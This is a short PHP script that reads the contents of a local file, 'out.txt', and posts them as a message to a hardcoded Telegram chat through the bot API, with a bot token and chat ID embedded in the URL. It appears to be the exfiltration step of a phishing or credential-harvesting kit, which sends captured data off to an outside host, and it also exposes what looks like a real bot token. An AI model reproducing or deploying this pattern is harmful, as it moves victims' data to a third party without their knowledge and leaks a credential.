<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot1179022808:AAHyI0cdprUzHYw2A6YTLCwzUsi5YMH3wkA/sendMessage?chat_id=1266471608&text=$msg");
?>